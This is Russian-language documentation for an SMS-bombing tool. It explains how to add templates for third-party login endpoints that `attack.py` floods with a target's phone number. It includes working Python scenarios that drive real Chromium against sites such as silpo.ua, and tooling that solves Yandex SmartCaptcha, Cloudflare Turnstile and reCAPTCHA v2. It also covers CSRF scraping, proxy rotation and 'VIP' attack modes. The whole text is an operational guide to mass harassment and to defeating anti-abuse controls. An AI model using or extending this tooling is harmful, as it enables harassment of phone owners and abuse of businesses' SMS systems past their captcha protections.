# Сервисы и Yandex SmartCaptcha

`services.json` — список шаблонов, которые крутит `attack.py`. Один шаблон —
один HTTP-запрос со номером телефона. Правка файла не требует сборки:
кнопка **Сервисы → Перезагрузить** в админке (или `/reload` в боте)
перечитывает список; идущие атаки доживают на прежнем.

## Добавить сервис

Удобнее всего инструментом — он сам проверяет шаблон теми же правилами, что
и бот, находит sitekey SmartCaptcha и по желанию решает одну капчу:

```bash
# сервис с Yandex SmartCaptcha
tools/add_service.py --name Cafe_RU_SMS --country RU \
    --url https://cafe.example/api/send \
    --page https://cafe.example/login \
    --header "Origin: https://cafe.example" \
    --body '{"phone":"{{RAW}}","captcha":"{{YANDEX}}"}' \
    --content-type application/json \
    --api-ok '"sent":true' --probe --write

# без капчи
tools/add_service.py --name Shop_RU_SMS --country RU \
    --url https://shop.example/sms --body 'phone={{RAW}}' --write
```

`--dry-run` печатает запись и ничего не пишет; `--replace` перезаписывает
сервис с тем же именем; перед записью рядом появляется `.bak`.

Значения берутся из реального запроса страницы (DevTools → Network → Copy as
cURL), а не придумываются. `--page` — страница, на которой стоит виджет:
`sitekey` и `host` находятся по её HTML и скриптам. Если страница закрыта от
сервера, передайте `--proxy socks5://user:pass@host:port` (прокси из
`proxies.txt` подходят) или укажите `--sitekey ysc1_… --host example.com`.

## Поля шаблона

| Поле | Значение |
| --- | --- |
| `name` | уникальное имя, `<Сервис>_<Страна>_SMS` |
| `country` | `RU` или `UA` — по ней шаблон попадает в атаку |
| `method`, `url`, `headers`, `body`, `content_type` | сам запрос |
| `api_ok` / `api_error` | подстроки ответа: код ушёл / номер отклонён |
| `chain` | имя HTTP-цепочки из `attack.CHAINS` (несколько запросов) |
| `yandex_captcha` | параметры SmartCaptcha, см. ниже |
| `recaptcha_v3` | старый reCAPTCHA-байпасс (`{"anchor": …, "ttl": …}`) |
| `csrf` | источник токена со страницы (`{"url", "regex", "ttl"}`), см. ниже |
| `browser` | UI-сценарий для браузерного канала (VIP), см. ниже |

Плейсхолдеры подставляются в `url`, `body` и `headers`: `{{RAW}}` —
`380671234567`, `{{PLUS}}` — `+380671234567`, `{{LAST10}}`, `{{UA10}}`,
`{{RU1}}`… Форматов телефона несколько, потому что сервисы валидируют строку
по-разному: `{{RU4}}` — `+7(916) 123-45-67`, `{{RU8}}` — `+7(916) 123-4567`
(последняя пара без дефиса), `{{UASPACE}}` — `+380 67 123 45 67`,
`{{UAPAREN}}` — `+38(067) 123 45 67`. Полный список — `attack.variants()`.

`{{UUID}}` — новый `uuid4` на каждый запрос (если сервис требует уникальный
идентификатор попытки). Доступен в любом шаблоне.

## Браузерный канал (VIP)

Обычные пользователи бьют только реквестами. VIP-атаки параллельно ведут
браузерный канал: `browser.py` на чистом patchright поднимает настоящий
Chromium, и сервисы проходят свои сценарии как живой пользователь — открыть
страницу, ввести номер, нажать кнопку. Канал делит с атакой стоп, дедлайн,
rate-limit и счётчики; если Chromium не поднялся, HTTP-воркеры работают сами.

Сервис браузерного канала — асинхронная функция, а не запись в `services.json`:

```python
@service("silpo")
async def silpo(page: Page, phone: str) -> bool:
    phone_fmt = format_phone(phone, "+380")
    await page.goto("https://auth.silpo.ua/login", wait_until="domcontentloaded")
    field = await first_visible(page, ('input[type="tel"]', 'input[name="phone"]'), timeout=10.0)
    if field is None:
        raise RuntimeError("поле номера не найдено")
    await field.fill(phone_fmt)
    button = await first_visible(page, ('button:has-text("Увійти")', 'button[type="submit"]'), timeout=5.0)
    if button is not None:
        await button.click()
    else:
        await field.press("Enter")
    await page.wait_for_timeout(3000)
    return True
```

Реестр — `browser.SERVICES`: имя → функция. Сервисы запускаются оптимизированно
и по очереди. `BrowserAttack(phone, duration, services=..., workers=..., proxy=..., control=...)`
поднимает один Chromium на атаку, раздаёт изолированные контексты, крутит сервисы
строго по очереди и останавливается по стопу, дедлайну и ошибкам.

### Cloudflare Turnstile

Механика Turnstile-Solver вынесена в `turnstile_solver.py`, а `browser.py`
даёт тонкую обёртку для сценариев. Решение идёт в том же browser context,
что и основная страница, поэтому используется тот же прокси и cookies;
отдельный Chromium не поднимается. Вызов вставляется в тот момент, когда
виджет уже отрисован (обычно перед отправкой формы):

```python
from browser import solve_turnstile

token = await solve_turnstile(page, action="login")
if token is None:
    # виджета нет или решить не удалось — сценарий продолжается как обычно
    ...
```

По умолчанию helper не выбрасывает исключения и не перезапускает сценарий:
он ищет `data-sitekey` (или использует явный `sitekey=`), решает виджет,
подставляет токен в `cf-turnstile-response` и вызывает `data-callback`.
`strict=True` — для случая, когда без токена продолжать бессмысленно.
`solve_turnstile` можно вызывать и через метод `BrowserService.turnstile()`.
Для автономного решения без готовой страницы есть `TurnstileSolver`,
совместимый по имени с `AsyncTurnstileSolver` из оригинальной библиотеки.

### reCAPTCHA V2 (PyPasser)

Для браузерных сценариев доступно решение reCAPTCHA V2 (audio challenge)
через PyPasser. Механика вынесена в `recaptcha_v2.py`, а `browser.py`
предоставляет функции `recaptcha_challenge`, `solve_recaptcha_v2` и метод
`recaptcha_v2` у `BrowserService`. Решение выполняется на уже открытой странице
в текущем браузере:

```python
from browser import solve_recaptcha_v2

token = await solve_recaptcha_v2(page)
if token is None:
    # виджета нет или решить не удалось — сценарий продолжается как обычно
    ...
```

* `detect_recaptcha_v2(page)` / `recaptcha_challenge(page)` — безопасный поиск
  чекбокса reCAPTCHA V2 (`recaptcha/api2/anchor` или видимый `.g-recaptcha`)
  без изменения состояния страницы.
* `solve_recaptcha_v2(page, ...)` — решает капчу через аудио-распознавание (Vosk),
  подставляет токен в `#g-recaptcha-response` и вызывает `data-callback`.
* По умолчанию вызов non-fatal (`strict=False`): при ошибке, отсутствии виджета
  или `IpBlock` возвращается `None`, что позволяет вставлять проверку в середину
  сценария без риска сломать поток. В `strict=True` ошибки поднимаются
  как `RecaptchaV2Error` (или `RecaptchaBlocked` при бане IP со стороны Google).

## CSRF / nonce

Сервисы на Laravel и WordPress без токена из формы отвечают 302/403. Шаблон
описывает страницу-источник:

```json
"csrf": {
  "url": "https://app.mybiz.com.ua/entry",
  "regex": "name=\"_token\"\\s+value=\"([^\"]+)\"",
  "ttl": 300
}
```

Токен (первая группа regex) подставляется в `{{CSRF}}` в `url`, `body` и
`headers`. Запрос страницы идёт через ту же сессию/прокси, что и основной
запрос, поэтому cookie сохраняются; результат кэшируется на `ttl` секунд
(по умолчанию 300). Если токен не нашёлся, попытка не отправляется — в
диагностике это видно как ошибка `csrf`. `regex` по умолчанию ищет
`name="_token"`, для WordPress nonce задаётся явно:

```json
"csrf": {
  "url": "https://prontopizza.ua/",
  "regex": "\"ajax_nonce\"\\s*:\\s*\"([^\"]+)\""
}
```

## Yandex SmartCaptcha

```json
"yandex_captcha": {
  "sitekey": "ysc1_...",
  "host": "cafe.example",
  "href": "https://cafe.example/login",
  "ttl": 0,
  "cipher": "b"
}
```

* Токен кладётся в `{{YANDEX}}`, `{{YANDEX_CAPTCHA}}` или `{{SMARTCAPTCHA}}` —
  все три дают одну и ту же строку; выбирайте имя по смыслу поля в запросе.
* `ttl: 0` — новый токен на каждую попытку (обычный случай). `ttl: 30`
  разрешает переиспользовать токен, если сервис это допускает: меньше
  решений — больше запросов в секунду.
* `cipher` — сборка шифра из DevTools (`a`/`b`), нужна только если виджет
  придирается к отпечатку; по умолчанию берётся эталонный профиль.
* Вместо `sitekey`/`host` можно указать `"yandex_captcha": "https://site/login"`:
  тогда sitekey ищется по странице один раз за атаку. Инструмент
  `add_service.py --page` делает то же самое заранее и пишет sitekey в файл.
* Капча не поддерживается в шаблонах с `chain`: там запросы идут из
  `attack.py`, и токен подставляется в коде цепочки.

Токен привязан к egress-IP: решается через тот же прокси, что и запрос к
сервису. Если IP помечен, попытка падает с «нужен другой прокси» — прокси из
`proxies.txt` ротируются сами.

## Проверить

```bash
# жив ли эндпоинт и шаблон (без реальных SMS, безопасные номера)
tools/verify_services.py --countries RU --attempts 2

# только один сервис: сначала dry-run, затем запись
tools/add_service.py ... --probe --dry-run
```

`verify_services.py --write` переписывает `services.json`, выбрасывая мёртвые
эндпоинты; шаблоны с капчей, у которых не решился токен, остаются в файле с
вердиктом `captcha` — виноват IP, а не сервис.

## Выбросить мёртвое

Один прогон ничего не доказывает: прокси мог не отдать запрос, хост — ответить
через раз. Удаление идёт только по пересечению нескольких независимых прогонов:

```bash
# 1. полный прогон, 2-3 раза, последний — без прокси
tools/verify_services.py --attempts 3 --proxies proxies.txt \
    --root-check --report /tmp/rep_proxy1.json
tools/verify_services.py --attempts 5 --proxies proxies.txt \
    --root-check --report /tmp/rep_proxy2.json
tools/verify_services.py --attempts 3 --root-check --report /tmp/rep_direct.json

# 2. просмотр, затем запись с бэкапом
tools/prune_services.py \
    --report /tmp/rep_proxy1.json --report /tmp/rep_proxy2.json \
    --report /tmp/rep_direct.json \
    --drop-run /tmp/rep_proxy1.json --drop-run /tmp/rep_proxy2.json \
    --drop-run /tmp/rep_direct.json --min-bad-runs 3
tools/prune_services.py ... --apply        # services.json.bak-<время>
```

Сервис удаляется, только если он не ответил ни в одном прогоне: `dead_host`
(таймаут, у которого не открылся даже корень), `error_server` (5xx),
`prepare_failed`, `broken_template`. Всё, что хоть раз ответило, остаётся.

`alive` (4xx) и `api_error` — не приговор: 400 обычно значит «тестовый номер не
прошёл валидацию». Перед удалением такого шаблона нужно прочитать тело ответа
(`tools/inspect_bodies.py <Имя> ...`): `{"phone":["Введите корректное
значение."]}` — рабочий эндпоинт, пустое тело при 200 или страница WAF — нет.

